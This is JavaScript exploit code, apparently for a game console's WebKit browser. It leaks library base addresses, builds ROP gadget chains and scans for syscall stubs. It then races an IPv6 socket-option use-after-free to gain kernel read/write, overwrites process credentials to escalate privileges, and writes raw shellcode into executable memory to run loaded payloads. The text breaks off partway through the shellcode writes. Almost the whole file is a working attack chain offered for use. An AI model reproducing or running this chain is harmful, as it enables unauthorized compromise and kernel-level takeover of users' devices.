var p;
var chain;
var payload_buffer;
var payload_writer;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x009A6040;
const OFFSET_WK_memset_import           = 0x00002458;
const OFFSET_WK___stack_chk_fail_import = 0x00002438;
const OFFSET_WK_setjmp_gadget_one       = 0x006D81F5;
const OFFSET_WK_setjmp_gadget_two       = 0x00288F83;
const OFFSET_WK_longjmp_gadget_one      = 0x006D81F5;
const OFFSET_WK_longjmp_gadget_two      = 0x00288F83;



const OFFSET_libcint_memset             = 0x000507D0;
const OFFSET_libcint_setjmp             = 0x000BE39C;
const OFFSET_libcint_longjmp            = 0x000BE3F6;

const OFFSET_lk___stack_chk_fail        = 0x00012AD0;
const OFFSET_lk_pthread_create_name_np  = 0x0001BB10;
const OFFSET_lk_pthread_exit            = 0x00019FD0;
const OFFSET_lk_pthread_self            = 0x0001D160;
const OFFSET_lk_pthread_setschedparam   = 0x0002AD70;

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret": 0x0000003C,
  "pop rdi": 0x0000835D,
  "pop rsi": 0x0003C987,
  "pop rdx": 0x00052B23,
  "pop rcx": 0x00026AFB,
  "pop r8": 0x00097D32,
  "pop r9": 0x005C6A81,
  "pop rax": 0x0001FA68,
  "pop rsp": 0x00078C62,

  "mov [rdi], rax": 0x000203E9,
  "mov [rdi], eax": 0x00020148,
  "mov [rdi], rsi": 0x000359F0,
  "cmp [rcx], edi": 0x0010DA31,

  "setne al": 0x00009000,
  "sete al": 0x0001E0C4,
  "setle al": 0x000CA7F6,
  "setl al": 0x005955AC,
  "setge al": 0x0061B262,
  "setg al": 0x000E4A37,
  "shl rax, 3": 0x005E8953,
  "add rax, rdx": 0x003D498C,
  "mov rax, [rax]": 0x0002E852,
  "inc dword [rax]": 0x003628DB,
  "infpoop": 0x0001386A
};

var textArea = document.createElement("textarea");

function stage2(pld) {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address_m(addr, size, type) {
    if(type != 1 && type != 2 && type != 4) {
        return undefined;
    }
    var og_array;
    if(type == 1) {
        og_array = new Uint8Array(0x4000);
    }
    if(type == 2) {
        og_array = new Uint16Array(0x2000);
    }
    if(type == 4) {
        og_array = new Uint32Array(0x1000);
    }
    var og_array_i = p.leakval(og_array).add32(0x10);
    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);
    nogc.push(og_array);
    return og_array;
  }
  
  function array_from_address(addr, size, type) {
    return array_from_address_m(addr,size,4);
  }
/*
  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
	
  }
*/
  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
  payload_writer = array_from_address_m(payload_buffer, 0xC0000*4, 1);
  
  var pld_arr = pld.split(',');
  for(var i = 0; i < pld_arr.length; i++) {
	  write_payload(payload_writer,pld_arr[i]);
	  chain.call(payload_buffer);
  }
  document.getElementById("pldooe").value="";
  document.getElementById("pldooe_full").value="";
  document.getElementById("progress").innerHTML="Payload(s) Loaded Successfully.. Reload to load next set of Payloads!!";
}

function stage3() {

  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;
  const PKTOPTS_RTHDR_OFFSET = 0x68;
  const PKTOPTS_TCLASS_OFFSET = 0xB0;

  const PROC_UCRED_OFFSET = 0x40;
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xB0;


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x120;

  const KERNEL_M_IP6OPT_OFFSET = 0x1A7AEA0;
  const KERNEL_MALLOC_OFFSET = 0x301840;
  const KERNEL_ALLPROC_OFFSET = 0x1B48318;
  const KERNEL_PMAP_STORE_OFFSET = 0x22C5268;

  const NUM_SPRAY_SOCKS = 200;
  const NUM_LEAK_SOCKS = 200;
  const NUM_SLAVE_SOCKS = 300;

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable) REBOOT");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap REBOOT");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave REBOOT");
    while (1) {};
  }

  function kernel_read8(address) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
    }
    chain.run();
    return p.read8(pktinfo_buffer);
  }

  function kernel_write8(address, value) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
      chain.push_write8(pktinfo_buffer, value);
      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    }
    chain.run();
  }

  function brute_force_kernel_map() {
    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
    for (var i = 0; i < 0xC0; i++) {
      var kernel_pmap_store = kernel_read8(attempt);
      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
        if ((kernel_base.low & 0x3FFF) == 0x0) {
          return;
        }
      }
      attempt.sub32inplace(0x01000000);
    }
    alert("[ERROR] failed to find kernel_map REBOOT");
    while (1) {};
  }

  function find_proc() {
    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = kernel_read8(proc);
    }
    alert("[ERROR] failed to find proc REBOOT");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = kernel_read8(filedesc);
    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //find vvictim
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

  find_execution_socket();
  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
  var write_handle = chain.syscall(534, exec_handle, 3);
  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  chain.syscall(324, 1);
  if(exec_address.low != 0x90000000) {
      alert("[ERROR] failed to allocate jit memory REBOOT");
      while(1){};
  }
  var exec_writer = p.array_from_address(write_address, 0x4000);
  for(var i = 0; i < 0x200; i++) {
      exec_writer[i] = 0x90909090;
  }
  exec_writer[0x200] = 0x37C0C748;
  exec_writer[0x201] = 0xC3000013;
  if(chain.call(exec_address).low != 0x1337) {
      alert("[ERROR] hmm weird REBOOT");
      while(1){};
  }

  exec_writer[0] = 0x54415355;
  exec_writer[1] = 0x1111BB48;
  exec_writer[2] = 0x11111111;
  exec_writer[3] = 0xBD481111;
  exec_writer[4] = 0x22222222;
  exec_writer[5] = 0x22222222;
  exec_writer[6] = 0xBFE4314D;
  exec_writer[7] = 0x000000C0;
  exec_writer[8] = 0xBADE8948;
  exec_writer[9] = 0x00000002;
  exec_writer[10] = 0x8349D5FF;
  exec_writer[11] = 0x814901C4;
  exec_writer[12] = 0x000500FC;
  exec_writer[13] = 0x41E47500;
  exec_writer[14] = 0x655D5B5C;
  exec_writer[15] = 0x25048B48;
  exec_writer[16] = 0x00000000;
  exec_writer[17] = 0x08408B48;
  exec_writer[18] = 0x48408B48;
  exec_writer[19] = 0x48008B48;
  exec_writer[20] = 0x333333B9;
  exec_writer[21] = 0x33333333;
  exec_writer[22] = 0xC7C74833;
  exec_writer[23] = 0x000002BE; // num sockets
  exec_writer[24] = 0x48F63148;
  exec_writer[25] = 0x117DFE39;
  exec_writer[26] = 0x48B1148B;
  exec_writer[27] = 0x00D004C7;
  exec_writer[28] = 0x48000000;
  exec_writer[29] = 0xEB01C683;
  exec_writer[30] = 0x44BF48EA;
  exec_writer[31] = 0x44444444;
  exec_writer[32] = 0x48444444;
  exec_writer[33] = 0x555555BE;
  exec_writer[34] = 0x55555555;
